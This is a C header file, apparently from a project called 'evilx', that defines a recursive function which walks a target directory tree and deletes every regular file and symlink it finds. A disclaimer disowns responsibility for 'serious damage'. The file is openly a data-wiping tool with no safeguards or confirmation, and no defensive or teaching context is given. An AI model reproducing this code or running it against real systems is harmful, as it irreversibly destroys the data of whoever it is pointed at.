#ifndef _EVILX_H_
#define _EVILX_H_

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <string.h>

// By YZBruh

/*
 * Copyright 2024 evilx
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at

 *     http://www.apache.org/licenses/LICENSE-2.0

 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

// I do not accept responsibility or responsibilities. The user or user is responsible for any serious damage that may occur!

void scanner(const char *TARGET_PATH) {
    DIR *TARGET;
    struct dirent *FILE;
    struct stat sb;

    // open directory
    if ((TARGET = opendir(TARGET_PATH)) == NULL) {
        perror("The target directory could not be opened!\n");
        exit(EXIT_FAILURE);
    }

    // scan files & dirs
    while ((FILE = readdir(TARGET)) != NULL) {
        char FILE_PATH[1024];
        snprintf(FILE_PATH, sizeof(FILE_PATH), "%s/%s", TARGET_PATH, FILE->d_name);

        // get info
        if (stat(FILE_PATH, &sb) == -1) {
            perror("The necessary information could not be obtained!\n");
            continue;
        }

        // if is founded file, erase
        if (S_ISREG(sb.st_mode) || S_ISLNK(sb.st_mode)) {
            printf("Erasing block: %s\n", FILE_PATH);
            if (unlink(FILE_PATH) == -1) {
                printf("Erasing failed. Continuing\n");
            }
        }
        // if it is a folder, access it and repeat the process
        else if (S_ISDIR(sb.st_mode)) {
            if (strcmp(FILE->d_name, ".") != 0 && strcmp(FILE->d_name, "..") != 0) {
                scanner(FILE_PATH);
            }
        }
    }
    closedir(TARGET);
}

#endif